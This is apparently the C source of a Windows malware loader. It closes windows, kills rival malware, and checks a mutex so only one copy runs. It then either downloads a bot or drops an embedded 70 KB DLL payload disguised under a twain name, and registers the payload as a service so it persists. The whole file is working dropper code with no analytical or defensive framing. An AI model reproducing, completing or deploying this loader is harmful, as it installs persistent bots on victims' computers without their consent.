#include "loader.h"
#define SIZE 70144

int WINAPI _WinMain(void)
{
	char dllpath[MAX_PATH];
	char test[128] = "HTTP/1.1 200";
//	char destination[1024];
	HANDLE presence, file;
	DWORD write;

	CloseWindows();
#ifdef FRELEASE
	KillEnemys();
#endif
	presence = CreateMutex(NULL, TRUE, PRESENCE_NAME);
	if(GetLastError() == ERROR_ALREADY_EXISTS) 		
		return 0;
#ifndef FRELEASE
	delservice(SERVICE_NAME);
#endif
	ExpandEnvironmentStrings(DESTINATION, dllpath, MAX_PATH);
#ifdef DOWNLOAD
	DownloadBot(dllpath);
#else
	file = CreateFile(dllpath, GENERIC_ALL, 0, NULL, 
		CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if(file == INVALID_HANDLE_VALUE)
	{
		deb("dropfile: failed to create file %s error: %s\n", dllpath, FORMATERROR);
		CloseHandle(file);
		return -1;
	}
	WriteFile(file, twain_16_dump, SIZE, &write, NULL);

	if(write != SIZE)
	{
		deb("dropfile: not all bytes written! written:%lu need:%lu\n", write, SIZE);
		CloseHandle(file);
		return -1;
	}

	CloseHandle(file);
#endif
	deb("registering service...");
	RegisterService(dllpath);

#ifdef SPECIAL
	deb("registering nick");
	RegistrySetCryptedSetting("Entry", SPECIAL);
#endif
	ExitProcess(0);
}




